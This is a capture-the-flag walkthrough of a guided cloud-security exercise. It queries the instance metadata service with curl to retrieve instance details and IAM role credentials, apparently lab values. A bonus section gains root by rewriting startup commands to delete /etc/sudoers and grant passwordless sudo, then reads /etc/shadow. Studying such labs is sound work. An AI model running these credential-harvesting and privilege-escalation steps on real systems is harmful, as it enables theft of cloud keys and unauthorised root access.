# IMDS Exploration
**Location: Restroom, Frost Tower, 16<sup>th</sup> Floor**  
**Troll: Noxious O. D'or**

This objective is a training about what data could be retrieved from the Instance Metadata Service (IMDS) in cloud environments.
It is a completely guided exercise.
```bash
elfu@c27f40ac7165:~$ ping -c1 169.254.169.254
```
```
PING 169.254.169.254 (169.254.169.254) 56(84) bytes of data.
64 bytes from 169.254.169.254: icmp_seq=1 ttl=64 time=0.014 ms

--- 169.254.169.254 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.014/0.014/0.014/0.000 ms
```
---
```bash
elfu@c27f40ac7165:\~$ next
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest
```
```
dynamic
meta-data
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/dynamic
```
```
fws/instance-monitoring
instance-identity/document
instance-identity/pkcs7
instance-identity/signature
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document
```
```json
{
        "accountId": "PCRVQVHN4S0L4V2TE",
        "imageId": "ami-0b69ea66ff7391e80",
        "availabilityZone": "np-north-1f",
        "ramdiskId": null,
        "kernelId": null,
        "devpayProductCodes": null,
        "marketplaceProductCodes": null,
        "version": "2017-09-30",
        "privateIp": "10.0.7.10",
        "billingProducts": null,
        "instanceId": "i-1234567890abcdef0",
        "pendingTime": "2021-12-01T07:02:24Z",
        "architecture": "x86_64",
        "instanceType": "m4.xlarge",
        "region": "np-north-1"
}
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
```
```json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   451  100   451    0     0   440k      0 --:--:-- --:--:-- --:--:--  440k
{
  "accountId": "PCRVQVHN4S0L4V2TE",
  "imageId": "ami-0b69ea66ff7391e80",
  "availabilityZone": "np-north-1f",
  "ramdiskId": null,
  "kernelId": null,
  "devpayProductCodes": null,
  "marketplaceProductCodes": null,
  "version": "2017-09-30",
  "privateIp": "10.0.7.10",
  "billingProducts": null,
  "instanceId": "i-1234567890abcdef0",
  "pendingTime": "2021-12-01T07:02:24Z",
  "architecture": "x86_64",
  "instanceType": "m4.xlarge",
  "region": "np-north-1"
}
```
---
```bash
elfu@c27f40ac7165:\~$ next
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/meta-data
```
```
ami-id
ami-launch-index
[...]
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/meta-data/public-hostname
```
```
ec2-192-0-2-54.compute-1.amazonaws.com
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/meta-data/public-hostname; echo
```
```
ec2-192-0-2-54.compute-1.amazonaws.com
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials; echo
```
```
elfu-deploy-role
```
---
```bash
elfu@c27f40ac7165:\~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role;echo
```
```json
{
        "Code": "Success",
        "LastUpdated": "2021-12-02T18:50:40Z",
        "Type": "AWS-HMAC",
        "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
        "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
        "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
        "Expiration": "2026-12-02T18:50:40Z"
}
```
---
```bash
elfu@c27f40ac7165:\~$ next
elfu@c27f40ac7165:\~$ cat gettoken.sh
```
```
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
```
---
```bash
elfu@c27f40ac7165:\~$ source gettoken.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    44  100    44    0     0  44000      0 --:--:-- --:--:-- --:--:-- 44000
```
---
```
elfu@c27f40ac7165:\~$ echo $TOKEN
Uv38ByGCZU8WP18PmmIdcpVmx00QA3xNe7sEB9Hixkk=
elfu@c27f40ac7165:\~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region; echo
np-north-1e
```

### Bonus: Root Access to Terminal

 Suspend the session in the bottom pane with CTRL-Z
 ```
 init@c22e7dc1a1f1:~$ cp questions_answers.json questions_answers.json2
init@c22e7dc1a1f1:~$ mv questions_answers.json2 questions_answers.json
mv: replace 'questions_answers.json', overriding mode 0644 (rw-r--r--)? y
init@c22e7dc1a1f1:~$ vi questions_answers.json
 ``` 
 Change file to re-create the suders file with sudo to root permissions for the user elfu:
 ```
 "questions":[
{
  "cmds_on_begin":[
    "sudo /opt/imds/imds.sh 2>&1 >/tmp/.imds.log &",
    "sudo rm /etc/sudoers",
    "echo 'elfu ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
],
 ```
 Next the tmux session has to be renamed:  
 CTRL-B
 `:rename-session -t ElfU e`
 Finally, a new session is started:  
 ```
init@c22e7dc1a1f1:~$ tmuxp load mysession.yaml
[Loading] /home/init/mysession.yaml
Already inside TMUX, switch to session? yes/no
Or (a)ppend windows in the current active session?
[y/n/a]: y
 elfu@c22e7dc1a1f1:~$ sudo bash
root@c22e7dc1a1f1:/home/elfu# id
uid=0(root) gid=0(root) groups=0(root)
root@c22e7dc1a1f1:/home/elfu# cat /etc/shadow
root:$6$PzcpSOrlQdaqyDbS$Y3pZzo53tSYHpf4uFhwYvQ3HR/z04hDhNlL4dwfGmef2oleaLsg7q.kaGAbD3fUTGKSc.3h3vNssC9Kt3HjdN.:18954:0:99999:7:::
 ```
 
**Achievement: IMDS Exploration**  
The Troll provides hints for [objective 10](https://github.com/joergschwarzwaelder/hhc2021/tree/master/Objective-10):  
**Hint: AWS IMDS Documentation**
